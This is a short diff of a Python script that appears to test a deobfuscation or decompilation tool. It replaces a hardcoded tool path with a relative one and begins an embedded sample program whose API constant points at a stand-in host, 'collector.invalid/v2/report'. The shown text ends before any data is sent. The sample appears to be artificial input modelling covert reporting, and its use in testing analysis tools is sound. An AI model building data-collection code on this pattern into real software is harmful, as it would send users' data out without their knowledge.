@@ -8,13 +8,14 @@ import base64
 import lzma
 import marshal
 import os
+import pathlib
 import subprocess
 import sys
 import sysconfig
 import tempfile
 import zlib
 
-TOOL = "/home/user/pydeob/dist/pydecomp.py"
+TOOL = str(pathlib.Path(__file__).resolve().parents[2] / "dist" / "pydecomp.py")
 PROGRAM = (
     'import os\n'
     'API = "https://collector.invalid/v2/report"\n'
